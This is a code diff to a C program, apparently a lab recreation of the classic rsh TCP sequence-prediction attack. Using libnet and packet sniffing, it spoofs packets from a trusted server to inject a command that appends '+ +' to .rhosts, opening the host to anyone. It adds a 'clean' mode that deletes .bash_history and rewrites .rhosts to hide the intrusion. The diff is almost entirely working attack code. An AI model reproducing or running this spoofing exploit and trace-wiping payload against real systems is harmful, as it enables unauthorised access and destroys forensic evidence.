@@ -15,7 +15,10 @@
 #define SNIFFIP "172.16.45.5"
 #define SRCPORT 514
 #define DSTPORT 514
-
+#define EXPLOIT "0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts"
+#define EXPLOITLEN 44
+#define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history ; echo -e 'server tsutomu\n' > .rhosts.back"
+#define CLEANLEN 78
 
 void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
 
@@ -32,24 +35,12 @@ int main(int argc, char **argv)
     libnet_t *l;  
     char errbuf[LIBNET_ERRBUF_SIZE];
     int clean=0;
-    char *EXPLOIT="0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts";
-    int EXPLOITLEN=44;
-
-
+    
     if(argc>1)
     {
         if(strcmp(argv[1],"clean")==0)
-        {
-            EXPLOIT="0\0tsutomu\0tsutomu\0rm .bash_history ; echo -e 'server tsutomu\n' > .rhosts.back";
-            EXPLOITLEN=78;
-        }
-        else
-        {
-            EXPLOIT="0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts";
-            EXPLOITLEN=44;
-        }
+            clean=1;
     }
-
     l = libnet_init(LIBNET_RAW4, NULL, errbuf);
 
     //Check on libnet initialization
@@ -90,14 +81,22 @@ int main(int argc, char **argv)
     libnet_clear_packet(l);
     //Create the pscket sniffer
     pcap_t *des=packetSnifferInitialize();
+
     uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
     libnet_clear_packet(l);
     printf("\nNext: %u",next);
     fflush(stdout);
-
-    printf("\nEXPLOITING");
-    sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l);
-    
+    if (clean==0)
+    {
+        //Exploiting RSH
+        printf("\nEXPLOITING");
+        sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l);
+    }
+    else
+    {
+        printf("\nCLEANING");
+        sendExploit(next,CLEAN,CLEANLEN,xterminal,server, l );
+    }
     
     
     libnet_clear_packet(l);
@@ -119,7 +118,7 @@ void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_lon
         tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1234,(u_int32_t)1,NULL,0,TH_SYN);
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)0);
         sendPacket(l);
-        usleep(100);
+        sleep(1);
 
 //ACK
         tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1235,next+1,(char*)payload,plen, (u_int8_t)(TH_ACK | TH_PUSH));
